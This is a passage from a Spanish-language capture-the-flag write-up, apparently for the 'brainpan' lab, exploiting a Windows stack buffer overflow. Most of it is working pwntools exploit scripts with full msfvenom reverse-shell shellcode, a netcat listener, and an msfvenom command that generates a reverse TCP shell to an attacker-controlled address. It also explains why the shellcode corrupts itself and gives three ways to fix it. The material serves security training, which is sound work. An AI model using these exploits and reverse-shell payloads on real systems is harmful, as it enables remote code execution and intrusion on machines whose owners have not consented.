payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">shellcode

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Nos ponemos en escucha con <code class="language-plaintext highlighter-rouge">netcat</code> y corremos el <code class="language-plaintext highlighter-rouge">exe</code> desde una shell normal</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
Listening on 0.0.0.0 443  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="am">.\brainpan.exe  </span><span class="p">
[+] initializing winsock...done.
[+] server socket created.
[+] bind done on port 9999
[+] waiting for connections.</span>
</code></pre></div></div><br>

<p class="plain-text">Ejecutamos el <code class="language-plaintext highlighter-rouge">exploit</code> y el programa corrompe sin embargo <code class="language-plaintext highlighter-rouge">no</code> recibimos una shell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9999</span>
</code></pre></div></div><br>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
Listening on 0.0.0.0 443  </span>
</code></pre></div></div><br>

</section>

<section class="post" id="shellcode">
<br><h3 class="post-title">Shellcode Analisis</h3><br>

<p class="plain-text">He visto a personas omitir esta parte y usar nops desplazando la pila porque si o dar explicaciones sin ningun sentido, y en realidad es bastante importante entender el porque y soluciones, asi que analizemos las primeras <code class="language-plaintext highlighter-rouge">2</code> lineas del <code class="language-plaintext highlighter-rouge">shellcode</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="s">"</span><span class="mi">\xda\xc2\xd9\x74\x24\xf4\x58\xbd\x91\x4d\xed</span><span class="s">"
"</span><span class="mi">\x34\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13</span><span class="s">"  </span>
</code></pre></div></div><br>

<p class="plain-text">Para verlo en ensamblador podemos usar el <code class="language-plaintext highlighter-rouge">debugger</code>, enviamos nuestra petición y haciendo un <code class="language-plaintext highlighter-rouge">Follow in Dump</code> al <code class="language-plaintext highlighter-rouge">ESP</code> podemos ver las instrucciones que ejecuta</p>
<a href="/thm/brainpan/18.png" target="_blank"><div><p><img src="/thm/brainpan/18.png"></p></div></a>

<p class="plain-text">Las primeras 2 lineas shellcode <code class="language-plaintext highlighter-rouge">desensamblado</code> ejecutan las siguientes instrucciones</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">DAC2             </span><span class="o">FCMOVB </span><span class="p">ST,ST(</span><span class="mi">2</span><span class="p">)
D97424 F4        </span><span class="o">FSTENV </span><span class="p">(</span><span class="mi">28</span><span class="o">-</span><span class="no">BYTE</span><span class="p">) </span><span class="na">PTR</span><span class="mi"> SS</span><span class="p">:[</span><span class="mi">ESP</span><span class="o">-</span><span class="na">C</span><span class="p">]  
58               </span><span class="o">POP </span><span class="mi">EAX</span><span class="p">
BD 914DED34      </span><span class="o">MOV </span><span class="mi">EBP</span><span class="p">,34ED4D91
33C9             </span><span class="o">XOR </span><span class="mi">ECX</span><span class="p">,</span><span class="mi"</span><span class="mi">ECX</span><span class="p">
B1 52            </span><span class="o">MOV </span><span class="mi">CL</span><span class="p">,</span><span class="mi">52</span><span class="p">
83E8 FC          </span><span class="o">SUB </span><span class="mi">EAX</span><span class="p">,</span><span class="o">-</span><span class="mi">4</span><span class="p">
3168 13          </span><span class="o">XOR </span><span class="no">DWORD </span><span class="na">PTR </span><span class="mi">DS</span><span class="p">:[</span><span class="mi">EAX</span><span class="o">+</span><span class="mi">13</span><span class="p">],</span><span class="mi">EBP</span>
</code></pre></div></div><br>

<p class="plain-text">El <code class="language-plaintext highlighter-rouge">problema</code> es bastante evidente, <code class="language-plaintext highlighter-rouge">fstenv</code> esta almacenando información en <code class="language-plaintext highlighter-rouge">ESP</code>, pero el shellcode inicia en el <code class="language-plaintext highlighter-rouge">ESP</code>, significa que el <code class="language-plaintext highlighter-rouge">shellcode</code> se corrompe a si mismo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">D97424 F4        </span><span class="o">FSTENV </span><span class="p">(</span><span class="mi">28</span><span class="o">-</span><span class="no">BYTE</span><span class="p">) </span><span class="na">PTR</span><span class="mi"> SS</span><span class="p">:[</span><span class="mi">ESP</span><span class="o">-</span><span class="na">C</span><span class="p">]  </span>
</code></pre></div></div><br>

<p class="plain-text">Hay varias soluciones la primera y la mas sencilla es enviar antes unos <code class="language-plaintext highlighter-rouge">nops</code> (<code class="language-plaintext highlighter-rouge">\x90</code>) para que el shellcode no inicie en la pila y darle un margen al <code class="language-plaintext highlighter-rouge">fstenv</code>, basta con <code class="language-plaintext highlighter-rouge">16</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">= </span><span class="mi">524</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="p">offset
nops </span><span class="o">= </span><span class="s">"</span><span class="mi">\x90</span><span class="s">"</span><span class="o"> * </span><span class="mi">16</span><span class="p">

jmpesp </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xf3\x12\x17\x31</span><span class="s">"</span><span class="p">

shellcode </span><span class="o">= </span><span class="no"> b</span><span class="s">"</span><span class="mi"></span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xda\xc2\xd9\x74\x24\xf4\x58\xbd\x91\x4d\xed</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x34\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\xf9\x5e\x0f\xc1\x05\x88\x4d\x2a\xf5\x49</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x32\xa2\x10\x78\x72\xd0\x51\x2b\x42\x92\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc0\x29\xf6\xa3\x53\x5f\xdf\xc4\xd4\xea\x39</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xeb\xe5\x47\x79\x6a\x66\x9a\xae\x4c\x57\x55</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa3\x8d\x90\x88\x4e\xdf\x49\xc6\xfd\xcf\xfe</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x92\x3d\x64\x4c\x32\x46\x99\x05\x35\x67\x0c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1d\x6c\xa7\xaf\xf2\x04\xee\xb7\x17\x20\xb8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4c\xe3\xde\x3b\x84\x3d\x1e\x97\xe9\xf1\xed</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe9\x2e\x35\x0e\x9c\x46\x45\xb3\xa7\x9d\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6f\x2d\x05\x9f\xe4\x95\xe1\x21\x28\x43\x62</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2d\x85\x07\x2c\x32\x18\xcb\x47\x4e\x91\xea</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x87\xc6\xe1\xc8\x03\x82\xb2\x71\x12\x6e\x14</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8d\x44\xd1\xc9\x2b\x0f\xfc\x1e\x46\x52\x69</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd2\x6b\x6c\x69\x7c\xfb\x1f\x5b\x23\x57\xb7</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd7\xac\x71\x40\x17\x87\xc6\xde\xe6\x28\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf7\x2c\x7c\x67\x6f\x84\xfd\xec\x6f\x29\x28</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa2\x3f\x85\x83\x03\xef\x65\x74\xec\xe5\x69</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xab\x0c\x06\xa0\xc4\xa7\xfd\x23\x2b\x9f\x99</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe6\xc3\xe2\x61\x08\xaf\x6a\x87\x60\xdf\x3a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x10\x1d\x46\x67\xea\xbc\x87\xbd\x97\xff\x0c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x32\x68\xb1\xe4\x3f\x7a\x26\x05\x0a\x20\xe1</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1a\xa0\x4c\x6d\x88\x2f\x8c\xf8\xb1\xe7\xdb</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xad\x04\xfe\x89\x43\x3e\xa8\xaf\x99\xa6\x93</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6b\x46\x1b\x1d\x72\x0b\x27\x39\x64\xd5\xa8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x05\xd0\x89\xfe\xd3\x8e\x6f\xa9\x95\x78\x26</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x06\x7c\xec\xbf\x64\xbf\x6a\xc0\xa0\x49\x92</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x71\x1d\x0c\xad\xbe\xc9\x98\xd6\xa2\x69\x66</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0d\x67\x99\x2d\x0f\xce\x32\xe8\xda\x52\x5f</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0b\x31\x90\x66\x88\xb3\x69\x9d\x90\xb6\x6c</span><span class="s">"</span><span class="p">  
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd9\x16\x2b\x1d\x72\xf3\x4b\xb2\x73\xd6</span><span class="s">"</span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">nops </span><span class="o">+ </span><span class="p">shellcode

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Otra es un <code class="language-plaintext highlighter-rouge">opcode</code> que desplaze la pila podemos obtenerlo con <code class="language-plaintext highlighter-rouge">msf-nasm_shell</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msf-nasm_shell</span><span class="p">
nasm > sub esp,0x10
00000000  83EC10            sub esp,byte +0x10  
nasm ></span>
</code></pre></div></div><br>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">= </span><span class="mi">524</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="p">offset

opcode </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x83\xec\x10</span><span class="s">"</span><span class="p">
jmpesp </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xf3\x12\x17\x31</span><span class="s">"</span><span class="p">

shellcode </span><span class="o">= </span><span class="no"> b</span><span class="s">"</span><span class="mi"></span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xda\xc2\xd9\x74\x24\xf4\x58\xbd\x91\x4d\xed</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x34\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\xf9\x5e\x0f\xc1\x05\x88\x4d\x2a\xf5\x49</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x32\xa2\x10\x78\x72\xd0\x51\x2b\x42\x92\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc0\x29\xf6\xa3\x53\x5f\xdf\xc4\xd4\xea\x39</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xeb\xe5\x47\x79\x6a\x66\x9a\xae\x4c\x57\x55</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa3\x8d\x90\x88\x4e\xdf\x49\xc6\xfd\xcf\xfe</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x92\x3d\x64\x4c\x32\x46\x99\x05\x35\x67\x0c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1d\x6c\xa7\xaf\xf2\x04\xee\xb7\x17\x20\xb8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4c\xe3\xde\x3b\x84\x3d\x1e\x97\xe9\xf1\xed</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe9\x2e\x35\x0e\x9c\x46\x45\xb3\xa7\x9d\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6f\x2d\x05\x9f\xe4\x95\xe1\x21\x28\x43\x62</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2d\x85\x07\x2c\x32\x18\xcb\x47\x4e\x91\xea</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x87\xc6\xe1\xc8\x03\x82\xb2\x71\x12\x6e\x14</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8d\x44\xd1\xc9\x2b\x0f\xfc\x1e\x46\x52\x69</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd2\x6b\x6c\x69\x7c\xfb\x1f\x5b\x23\x57\xb7</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd7\xac\x71\x40\x17\x87\xc6\xde\xe6\x28\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf7\x2c\x7c\x67\x6f\x84\xfd\xec\x6f\x29\x28</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa2\x3f\x85\x83\x03\xef\x65\x74\xec\xe5\x69</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xab\x0c\x06\xa0\xc4\xa7\xfd\x23\x2b\x9f\x99</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe6\xc3\xe2\x61\x08\xaf\x6a\x87\x60\xdf\x3a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x10\x1d\x46\x67\xea\xbc\x87\xbd\x97\xff\x0c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x32\x68\xb1\xe4\x3f\x7a\x26\x05\x0a\x20\xe1</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1a\xa0\x4c\x6d\x88\x2f\x8c\xf8\xb1\xe7\xdb</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xad\x04\xfe\x89\x43\x3e\xa8\xaf\x99\xa6\x93</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6b\x46\x1b\x1d\x72\x0b\x27\x39\x64\xd5\xa8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x05\xd0\x89\xfe\xd3\x8e\x6f\xa9\x95\x78\x26</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x06\x7c\xec\xbf\x64\xbf\x6a\xc0\xa0\x49\x92</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x71\x1d\x0c\xad\xbe\xc9\x98\xd6\xa2\x69\x66</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0d\x67\x99\x2d\x0f\xce\x32\xe8\xda\x52\x5f</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0b\x31\x90\x66\x88\xb3\x69\x9d\x90\xb6\x6c</span><span class="s">"</span><span class="p">  
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd9\x16\x2b\x1d\x72\xf3\x4b\xb2\x73\xd6</span><span class="s">"</span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">opcode </span><span class="o">+ </span><span class="p">shellcode

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Y la que creo mas conveniente al menos en este caso especifico es utilizar otro tipo de <code class="language-plaintext highlighter-rouge">encoder</code> como <code class="language-plaintext highlighter-rouge">jmp_call_additive</code> que no tendrá instrucciones en el <code class="language-plaintext highlighter-rouge">ESP</code> como si las tiene el encoder <code class="language-plaintext highlighter-rouge">shikata_ga_nai</code> que es el que se usa por <code class="language-plaintext highlighter-rouge">defecto</code> ya que el saltar a diferentes partes de la memoria es parte de su tecnica de <code class="language-plaintext highlighter-rouge">ofuscación</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">✘</span><span class="p"> -e x86/shikata_ga_nai
</span><span class="ve">✔</span><span class="p"> -e x86/jmp_call_additive  </span>
</code></pre></div></div><br>

<p class="plain-text">Asi que creamos un nuevo <code class="language-plaintext highlighter-rouge">shellcode</code> ahora con el encoder <code class="language-plaintext highlighter-rouge">x86/jmp_call_additive</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/shell_reverse_tcp -a x86 LHOST=192.168.100.85 LPORT=443 EXITFUNC=thread -b </span><span class="am">'\x00'</span><span class="p"> -f python -v shellcode -e x86/jmp_call_additive  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of python file: 1990 bytes
shellcode =  b""
shellcode += b"\xfc\xbb\x46\xbc\x5d\x42\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\xba\x54\xdf\x42\x42\xa5\x80\xcb"
shellcode += b"\xa7\x94\x80\xa8\xac\x87\x30\xba\xe0\x2b\xba"
shellcode += b"\xee\x10\xbf\xce\x26\x17\x08\x64\x11\x16\x89"
shellcode += b"\xd5\x61\x39\x09\x24\xb6\x99\x30\xe7\xcb\xd8"
shellcode += b"\x75\x1a\x21\x88\x2e\x50\x94\x3c\x5a\x2c\x25"
shellcode += b"\xb7\x10\xa0\x2d\x24\xe0\xc3\x1c\xfb\x7a\x9a"
shellcode += b"\xbe\xfa\xaf\x96\xf6\xe4\xac\x93\x41\x9f\x07"
shellcode += b"\x6f\x50\x49\x56\x90\xff\xb4\x56\x63\x01\xf1"
shellcode += b"\x51\x9c\x74\x0b\xa2\x21\x8f\xc8\xd8\xfd\x1a"
shellcode += b"\xca\x7b\x75\xbc\x36\x7d\x5a\x5b\xbd\x71\x17"
shellcode += b"\x2f\x99\x95\xa6\xfc\x92\xa2\x23\x03\x74\x23"
shellcode += b"\x77\x20\x50\x6f\x23\x49\xc1\xd5\x82\x76\x11"
shellcode += b"\xb6\x7b\xd3\x5a\x5b\x6f\x6e\x01\x34\x5c\x43"
shellcode += b"\xb9\xc4\xca\xd4\xca\xf6\x55\x4f\x44\xbb\x1e"
shellcode += b"\x49\x93\xbc\x34\x2d\x0b\x43\xb7\x4e\x02\x80"
shellcode += b"\xe3\x1e\x3c\x21\x8c\xf4\xbc\xce\x59\x5a\xec"
shellcode += b"\x60\x32\x1b\x5c\xc1\xe2\xf3\xb6\xce\xdd\xe4"
shellcode += b"\xb9\x04\x76\x8e\x40\xcf\xb9\xe7\x2e\x5a\x52"
shellcode += b"\xfa\xae\x65\x19\x73\x48\x0f\x4d\xd2\xc3\xb8"
shellcode += b"\xf4\x7f\x9f\x59\xf8\x55\xda\x5a\x72\x5a\x1b"
shellcode += b"\x14\x73\x17\x0f\xc1\x73\x62\x6d\x44\x8b\x58"
shellcode += b"\x19\x0a\x1e\x07\xd9\x45\x03\x90\x8e\x02\xf5"
shellcode += b"\xe9\x5a\xbf\xac\x43\x78\x42\x28\xab\x38\x99"
shellcode += b"\x89\x32\xc1\x6c\xb5\x10\xd1\xa8\x36\x1d\x85"
shellcode += b"\x64\x61\xcb\x73\xc3\xdb\xbd\x2d\x9d\xb0\x17"
shellcode += b"\xb9\x58\xfb\xa7\xbf\x64\xd6\x51\x5f\xd4\x8f"
shellcode += b"\x27\x60\xd9\x47\xa0\x19\x07\xf8\x4f\xf0\x83"
shellcode += b"\x18\xb2\xd0\xf9\xb0\x6b\xb1\x43\xdd\x8b\x6c"
shellcode += b"\x87\xd8\x0f\x84\x78\x1f\x0f\xed\x7d\x5b\x97"
shellcode += b"\x1e\x0c\xf4\x72\x20\xa3\xf5\x56\x20\x43\x0a"  
shellcode += b"\x59"</span>
</code></pre></div></div><br>

<p class="plain-text">De esta manera no necesitamos desplazar la pila y seria <code class="language-plaintext highlighter-rouge">junk + jmpesp + shellcode</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">= </span><span class="p">524
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="p">offset

jmpesp </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xf3\x12\x17\x31</span><span class="s">"</span><span class="p">

shellcode </span><span class="o">= </span><span class="no"> b</span><span class="s">"</span><span class="mi"></span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xbb\x46\xbc\x5d\x42\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xff\xff\xff\xba\x54\xdf\x42\x42\xa5\x80\xcb</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa7\x94\x80\xa8\xac\x87\x30\xba\xe0\x2b\xba</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xee\x10\xbf\xce\x26\x17\x08\x64\x11\x16\x89</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd5\x61\x39\x09\x24\xb6\x99\x30\xe7\xcb\xd8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x75\x1a\x21\x88\x2e\x50\x94\x3c\x5a\x2c\x25</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb7\x10\xa0\x2d\x24\xe0\xc3\x1c\xfb\x7a\x9a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xbe\xfa\xaf\x96\xf6\xe4\xac\x93\x41\x9f\x07</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6f\x50\x49\x56\x90\xff\xb4\x56\x63\x01\xf1</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x51\x9c\x74\x0b\xa2\x21\x8f\xc8\xd8\xfd\x1a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xca\x7b\x75\xbc\x36\x7d\x5a\x5b\xbd\x71\x17</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2f\x99\x95\xa6\xfc\x92\xa2\x23\x03\x74\x23</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x77\x20\x50\x6f\x23\x49\xc1\xd5\x82\x76\x11</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb6\x7b\xd3\x5a\x5b\x6f\x6e\x01\x34\x5c\x43</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb9\xc4\xca\xd4\xca\xf6\x55\x4f\x44\xbb\x1e</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x49\x93\xbc\x34\x2d\x0b\x43\xb7\x4e\x02\x80</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe3\x1e\x3c\x21\x8c\xf4\xbc\xce\x59\x5a\xec</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x60\x32\x1b\x5c\xc1\xe2\xf3\xb6\xce\xdd\xe4</span><span class="s">"</span><span class="p">
